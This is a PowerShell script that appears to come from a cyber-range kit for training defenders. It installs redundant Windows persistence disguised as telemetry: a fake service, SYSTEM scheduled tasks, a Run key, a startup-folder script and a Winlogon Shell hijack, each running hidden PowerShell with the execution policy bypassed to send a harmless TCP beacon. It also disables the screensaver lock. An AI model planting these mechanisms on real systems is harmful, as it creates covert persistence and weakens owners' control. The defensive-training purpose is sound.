#requires -Version 5.1
<#  Category: Persistence (service, scheduled task, run key, startup, winlogon)

    Plants several redundant, discoverable persistence mechanisms disguised as
    telemetry/health tooling. The "beacon" only performs a TCP check-in to the
    range-internal Config.BeaconHost:BeaconPort so the blue team can find it —
    it carries no payload. Point BeaconHost at a sinkhole/listener you control.
#>
param([hashtable]$Config)
$ErrorActionPreference = 'Continue'
if (-not $Config) {
    $d = $PSScriptRoot; while ($d -and -not (Test-Path (Join-Path $d 'modules\RangeCommon.psm1'))) { $d = Split-Path $d -Parent }
    Import-Module (Join-Path $d 'modules\RangeCommon.psm1') -Force
    $Config = Import-PowerShellDataFile (Join-Path $d 'config\range.config.psd1')
    Initialize-RangeContext; Assert-RangeSafety -Config $Config
}
$cat  = 'persistence'
$dir  = 'C:\ProgramData\SysTasks'
New-Item -ItemType Directory -Path $dir -Force | Out-Null

$bhost = $Config.BeaconHost; $bport = $Config.BeaconPort; $bint = $Config.BeaconIntervalSeconds

# Looping beacon (service payload)
@"
# Range check-in beacon (educational). TCP connect only, no payload.
while (`$true) {
    try { Test-NetConnection -ComputerName '$bhost' -Port $bport -WarningAction SilentlyContinue | Out-Null } catch {}
    Start-Sleep -Seconds $bint
}
"@ | Set-Content "$dir\svc.ps1" -Encoding UTF8

# One-shot beacon (scheduled-task / run-key / startup payload)
@"
try { Test-NetConnection -ComputerName '$bhost' -Port $bport -WarningAction SilentlyContinue | Out-Null } catch {}
"@ | Set-Content "$dir\health.ps1" -Encoding UTF8
Write-RangeManifest $cat 'drop-script' "$dir\svc.ps1;$dir\health.ps1 -> ${bhost}:$bport"

# ── 1) Fake Windows service ──────────────────────────────────────────────
$svcName = 'WinTelemetryHelper'
Invoke-Native 'sc.exe' @('create',$svcName,'binPath=',"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dir\svc.ps1",'start=','auto','DisplayName=','Windows Telemetry Helper') $cat
Invoke-Native 'sc.exe' @('description',$svcName,'System telemetry collection service') $cat
Invoke-Native 'sc.exe' @('start',$svcName) $cat

# ── 2) Scheduled tasks (interval + logon), running as SYSTEM ─────────────
Invoke-Native 'schtasks.exe' @('/create','/tn','System Update Check','/tr',"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dir\health.ps1",'/sc','minute','/mo','5','/ru','SYSTEM','/f') $cat
Invoke-Native 'schtasks.exe' @('/create','/tn','Windows Health Monitor','/tr',"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dir\health.ps1",'/sc','onlogon','/ru','SYSTEM','/f') $cat

# ── 3) Run key ───────────────────────────────────────────────────────────
Set-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'SysHealth' String "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dir\health.ps1" $cat

# ── 4) All-users startup folder ──────────────────────────────────────────
$startup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SysHealth.ps1"
Copy-Item "$dir\health.ps1" $startup -Force
Write-RangeManifest $cat 'startup-folder' $startup

# ── 5) Winlogon Shell hijack (explorer still launches first) ─────────────
Set-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Shell' String "explorer.exe, powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dir\health.ps1" $cat

# ── 6) Disable screensaver lock (low-noise convenience for persistence) ──
Set-RegValue 'HKCU:\Control Panel\Desktop' 'ScreenSaverIsSecure' String '0' $cat
Set-RegValue 'HKCU:\Control Panel\Desktop' 'ScreenSaveActive'    String '0' $cat

Write-RangeLog 'Persistence category complete.' 'OK'
